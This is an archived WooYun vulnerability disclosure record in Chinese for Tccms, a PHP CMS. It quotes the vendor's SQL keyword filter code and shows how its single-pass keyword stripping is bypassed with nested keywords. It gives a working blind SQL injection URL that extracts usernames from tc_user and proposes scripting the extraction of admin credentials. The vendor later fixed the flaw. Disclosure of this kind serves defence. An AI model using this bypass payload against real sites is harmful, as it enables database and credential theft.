{"id": 53447, "wybug_id": "wooyun-2014-067645", "wybug_title": "Tccms sql注入一枚。（绕过防护机制）", "wybug_corp": "teamcen.com", "wybug_author": "roker", "wybug_date": "2014-07-09 18:05", "wybug_open_date": "2014-10-07 18:06", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经修复", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-07-09：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-07-10：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-09-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-09-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-09-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-10-07：\t厂商已经修复漏洞并主动公开，细节向公众公开  简要描述： rt 详细说明：  直接看到/app/model/attackAction.class.php这个文件\npublic function initLogHacker() {\t\t/*get*/\t\tforeach($_GET as $key=>$value){\t\t\tif (!in_array($key, array('ac','a','c','do'))){//防止控制器和方法命名不规范被过滤\t\t\t\t$this->StopAttack($key,$value,\"get\",$this->getfilter);\t\t\t\t\t\t\t\t$_GET[$key] = StringUtil::safe_replace($value);\t\t\t\t$_GET[$key] = StringUtil::remove_xss($_GET[$key]);\t\t\t}\t\t}\n对于get类型的处理。跟进StopAttack\nprivate function inject_check($sql_str) {      \t  return eregi('select|insert|\\'|\\/\\*|\\*|\\.\\.\\/|\\.\\/|union|into|and|or|load_file|outfile', $sql_str);// 进行过滤      \t}.........private function StopAttack($StrFiltKey,$StrFiltValue,$method,$ArrFiltReq){\t\t$StrFiltValue = strtolower($StrFiltValue);\t\tif(is_array($StrFiltValue)) {\t\t\t$StrFiltValue=implode($StrFiltValue);\t\t}\t\tif ($this->inject_check($StrFiltValue) || preg_match ( \"/\" . $ArrFiltReq . \"/is\", $StrFiltValue ) == 1){\t\t\tif ($method == 'cookie') {\t\t\t\t$_COOKIE[$StrFiltKey] = '';\t\t\t\t$this->logAttack($StrFiltValue,$method);\t\t\t}\t\t\tif ($method == 'get') {\t\t\t\t$_GET[$StrFiltKey] = '';\t\t\t\t$this->logAttack($StrFiltValue,$method);\t\t\t}\t\t\tif ($method == 'post') {\t\t\t\t$_POST[$StrFiltKey] = '';\t\t\t\t$this->logAttack($StrFiltValue,$method);\t\t\t}\t\t}\t}\tprivate function logAttack($StrFiltValue,$method) {\t\t$attackStr = \"<br><br>SubmitIP:\".$_SERVER[\"REMOTE_ADDR\"].\"<br>SubmitTime:\".strftime(\"%Y-%m-%d %H:%M:%S\").\"<br>SubmitPage:\".$_SERVER[\"REQUEST_URI\"].\"<br>SubmitMethod:\".$_SERVER[\"REQUEST_METHOD\"].\"<br>SubmitParams:\".NetUtil::get_url().\"<br>SubmitData:\".$StrFiltValue;\t\t$mailObj = new Email();\t\t$this->url = NetUtil::get_url();\t\t$this->ip = NetUtil::getIp();\t\t$this->str = $attackStr;\t\t$this->killip = 0;\t\t$this->method = $method;\t\t$this->addtime = time();\t\t$row = $this->query(\"select id from \".TABLEPRE.\"attack where ip='\".NetUtil::getIp().\"'\");\t\tif (count($row) > 5) {\t\t\t$this->id = $row[0][\"id\"];\t\t\t$this->killip = 1;\t\t\t$this->update();\t\t} else {\t\t\t$this->save();\t\t}\t\tif (Config::get('attackmail') == 1) {\t\t\t$mailObj->Subject = \"WebSite Attack Notice\";\t\t\t$mailObj->Body = $attackStr;\t\t\t$mailObj->sendMail();\t\t}\t}}\n记录下attack然后发送邮件- -。继续看到 safe_replace\npublic static function safe_replace($string) {\t\t$string = strtolower($string);\t\t$string = str_replace(\"_\", '\\_', $string); // 把 '_'过滤掉       \t\t$string = str_replace(\"%\", '\\%', $string); // 把' % '过滤掉\t\t$string = str_replace('%20', '', $string);\t\t$string = str_replace('%27', '', $string);\t\t$string = str_replace('%2527', '', $string);\t\t$string = str_replace('*', '', $string);\t\t$string = str_replace('\"', '&quot;', $string);\t\t$string = str_replace(\"'\", '', $string);\t\t$string = str_replace('\"', '', $string);\t\t$string = str_replace(';', '', $string);\t\t$string = str_replace('<', '&lt;', $string);\t\t$string = str_replace('>', '&gt;', $string);\t\t$string = str_replace(\"{\", '', $string);\t\t$string = str_replace('}', '', $string);\t\t$string = str_replace('\\\\', '', $string);\t\t$string = str_replace('or', '', $string);\t\t$string = str_replace('insert', '', $string);\t\t$string = str_replace('select', '', $string);\t\t$string = str_replace('delete', '', $string);\t\t$string = str_replace('and', '', $string);\t\t$string = str_replace('union', '', $string);\t\t$string = str_replace('load_file', '', $string);\t\t$string = str_replace('outfil', '', $string);\t\t$string = str_replace('truncate', '', $string);\t\t$string = str_replace('..', '', $string);\t\t$string = str_replace('//', '/', $string);\t\t$string = str_replace('http:/', 'http://', $string);\t\treturn $string;\t}\n替换关键字为空。sql的话 remove_xss函数我们无视就好了。影响不大。我们找一个 执行sql语句的文件像这个。/app/controller/news.class.php注册用户get数据 http://localhost/index.php?ac=news_all&yz=1 aananddnd exists (selseselectlectect username from tc_user where ooorrrd(substring(username from 1 fooorrr 1))=97)%23。 在两次safe_replace后。 还原了我们的语句\n\n虽然记录了 attack到了数据库 但是语句还是执行了的。写个脚本循环替换 for x to 1 和 =97（+ -）的值 分分钟就可以获取到管理账号密码了。   漏洞证明：  \n\n   修复方案：  重写过滤函数   版权声明：转载请注明来源 roker@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2014-07-10 11:27 厂商回复： 是个高手，顶你。修复了 最新状态： 2014-07-22：fixed 2014-07-22：FIXED  ", "replys": "漏洞评价：\n评论\n     2014-07-10 15:29 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  高手 顶你。    \n     2014-07-11 01:33 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @′  雨。 你是 av    \n     2014-11-30 21:05 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  是个高手，顶你。    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}